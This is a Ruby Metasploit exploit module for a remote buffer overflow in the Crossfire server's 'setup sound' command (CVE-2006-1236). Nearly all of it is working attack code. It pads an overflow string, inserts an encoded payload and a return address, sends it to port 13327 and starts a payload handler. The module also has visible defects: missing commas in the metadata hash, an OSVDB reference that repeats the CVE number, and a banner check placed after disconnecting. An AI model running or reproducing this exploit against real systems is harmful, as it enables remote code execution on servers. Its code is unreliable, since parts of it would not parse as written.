##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Crossfire SetUp() Remote Buffer Overflow',
      'Description'	=> %q{
        This module exploit a buffer overflow in the setup sound command 
        of the Crossfire application.
      },
      'Author'	=> [ 'Skjallar', 'skjallar' ],
      'License'	=> MSF_LICENSE,
      'References'	=>
        [
          [ 'CVE', '2006-1236' ],
          [ 'OSVDB', '2006-1236' ],
          [ 'EDB', '1582' ]
        ],
      'Privileged'	=> false,
      'Payload'	=>
        {
          'Space' => 300,
          'BadChars' => "\x00\x0a\x0d\x20",
        }
      'Platform' => 'linux',
      'Targets'	=>
        [
          [ 'Kali Linux', { 'Ret' => 0x0807b918 } ],
        ],
      'DisclosureDate'  => 'Mar 13 2006'
      'DefaultTarget'	=> 0,
    ))

    register_options(
      [
        Opt::RPORT(13327)
      ],
      self.class
    )
  end

  def check
    connect
    disconnect

    if (banner =~ /version 1023 1027 Crossfire Server/)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe

  end

  def exploit
    connect

   sploit = "\x11(setup sound "
   sploit << rand_text_alpha_upper(91)
   sploit << payload.encoded
   sploit << rand_text_alpha_upper(4277 - payload.encoded.length)  
   sploit << [target.ret].pack('V')
   sploit << "C" * 7
   sploit << "\x90\x00#"
   
    sock.put(sploit)
    handler
    disconnect

  end
end
